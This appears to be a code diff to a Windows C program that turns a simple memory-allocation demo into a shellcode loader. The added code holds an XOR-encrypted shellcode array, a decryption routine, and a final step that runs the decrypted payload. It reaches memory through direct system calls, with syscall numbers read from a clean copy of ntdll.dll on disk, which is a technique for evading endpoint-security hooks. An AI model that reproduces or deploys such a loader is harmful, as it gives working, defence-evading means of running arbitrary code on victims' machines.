@@ -2,10 +2,20 @@
 #include <winternl.h>
 #include <stdio.h>
 
+
+static unsigned char sc[] = "\x94\x27\xed\x81\x83\x9c\xa8\x6f\x6e\x65\x32\x25\x29\x3f\x3c\x34\x25\x3c\x59\xbd\x0b\x2d\xf8\x26\x08\x27\xe5\x37\x6b\x3c\xe3\x3d\x4e\x2d\xf8\x06\x38\x27\x61\xd2\x39\x3e\x25\x5e\xa7\x2d\x42\xb4\xc4\x53\x0f\x19\x71\x58\x48\x2e\xaf\xac\x7e\x35\x69\xae\x8c\x88\x21\x35\x39\x27\xe5\x37\x53\xff\x2a\x53\x26\x64\xa3\xff\xe8\xe7\x6e\x65\x73\x3c\xed\xaf\x1a\x02\x3b\x75\xb8\x3f\xe5\x2d\x6b\x30\xe3\x2f\x4e\x2c\x72\xa4\x8b\x39\x26\x9a\xba\x35\xe3\x5b\xe6\x2d\x72\xa2\x25\x5e\xa7\x2d\x42\xb4\xc4\x2e\xaf\xac\x7e\x35\x69\xae\x56\x85\x06\x85\x24\x6c\x22\x41\x7b\x31\x51\xbe\x1b\xbd\x2b\x30\xe3\x2f\x4a\x2c\x72\xa4\x0e\x2e\xe5\x69\x3b\x30\xe3\x2f\x72\x2c\x72\xa4\x29\xe4\x6a\xed\x3b\x75\xb8\x2e\x36\x24\x2b\x2a\x31\x35\x2f\x3d\x32\x2d\x29\x35\x26\xe6\x9f\x54\x29\x3d\x91\x85\x2b\x35\x31\x35\x26\xee\x61\x9d\x3f\x90\x91\x9a\x2e\x3c\xd2\x6e\x6e\x65\x73\x74\x68\x6f\x6e\x2d\xfe\xf9\x69\x6e\x6e\x65\x32\xce\x59\xe4\x01\xe2\x8c\xa1\xd3\x9f\xdb\xc7\x25\x35\xd2\xc9\xfb\xd8\xee\x8b\xbd\x27\xed\xa1\x5b\x48\x6e\x13\x64\xe5\x88\x94\x1d\x6a\xd5\x22\x60\x06\x07\x05\x6e\x3c\x32\xfd\xb2\x90\xbb\x06\x12\x18\x0b\x41\x0b\x1d\x16\x74";
+
 DWORD g_NtAllocateVirtualMemorySyscall = 0;
 DWORD g_NtProtectVirtualMemorySyscall = 0;
 
-DWORD GetSyscallFromDisk10(const char* name){
+
+void xor_decrypt(unsigned char* data, size_t data_len, const unsigned char* key, size_t key_len) {
+    for (size_t i = 0; i < data_len; i++) {
+        data[i] ^= key[i % key_len];
+    } 
+}
+
+DWORD GetSyscallFromDiskClassic(const char* name){
     HMODULE cleanNtDll = LoadLibraryExA(
         "ntdll.dll",
         NULL,
@@ -56,7 +66,7 @@ DWORD ExtractSyscallNumber(BYTE* fn) {
     return 0;
 }
 
-DWORD GetSyscallFromDisk11(const char* name) {
+DWORD GetSyscallFromDisk(const char* name) {
     HMODULE cleanNtDll = LoadLibraryExA(
         "ntdll.dll",
         NULL,
@@ -77,8 +87,8 @@ DWORD GetSyscallFromDisk11(const char* name) {
 }
 
 void InitSyscalls(){
-    g_NtAllocateVirtualMemorySyscall = GetSyscallFromDisk10("NtAllocateVirtualMemory");
-    g_NtProtectVirtualMemorySyscall = GetSyscallFromDisk10("NtProtectVirtualMemory");
+    g_NtAllocateVirtualMemorySyscall = GetSyscallFromDiskClassic("NtAllocateVirtualMemory");
+    g_NtProtectVirtualMemorySyscall = GetSyscallFromDiskClassic("NtProtectVirtualMemory");
 }
 
 extern NTSTATUS NtAllocateVirtualMemory_syscall(
@@ -118,7 +128,7 @@ void* h_ntallocatevirtualmemory(SIZE_T size, ULONG protect){
 }
 
 void h_ntprotectvirtualmemory(void* buf, SIZE_T size, ULONG newprotect, PULONG oldprotect) {
-    
+
     NTSTATUS status = NtProtectVirtualMemory_syscall(
         GetCurrentProcess(),
         (PVOID*)&buf,
@@ -130,19 +140,31 @@ void h_ntprotectvirtualmemory(void* buf, SIZE_T size, ULONG newprotect, PULONG o
 
 int main(void){
     InitSyscalls();
-    char* buf = (char*)h_ntallocatevirtualmemory(0x1000, PAGE_READWRITE);
+    SIZE_T sc_size = sizeof(sc);
+    char* buf = (char*)h_ntallocatevirtualmemory(sc_size, PAGE_READWRITE);
     printf("buf=%p\n", buf);
     if (!buf) {
         return -1;
     }
 
-    strcpy_s(buf, 0x1000, "Hello from syscall-backed allocator");
+    /*strcpy_s(buf, 0x1000, "Hello from syscall-backed allocator");
     puts(buf);
-    fflush(stdout);
-    
+    fflush(stdout);*/
+
+    memcpy(buf, sc, sc_size);
+    //decrypt shellcode
+    static unsigned char key[] = "honest";
+    SIZE_T key_len = sizeof(key) - 1;  // drop '\0'
+    xor_decrypt((unsigned char*)buf, sc_size, key, key_len);
+   
     ULONG oldprotect;
-    h_ntprotectvirtualmemory(buf, 0x1000, PAGE_EXECUTE_READWRITE, &oldprotect); 
-    MessageBoxA(NULL, "this is a message", "Debug", MB_OK);
+    h_ntprotectvirtualmemory(buf, sc_size, PAGE_EXECUTE_READ, &oldprotect); 
+    MessageBoxA(NULL, "perms changed", "Debug", MB_OK);
+
+
+    // this is how you execute it 
+    void (*entry)() = (void (*)())buf;
+    entry();
 
     return 0;
 }
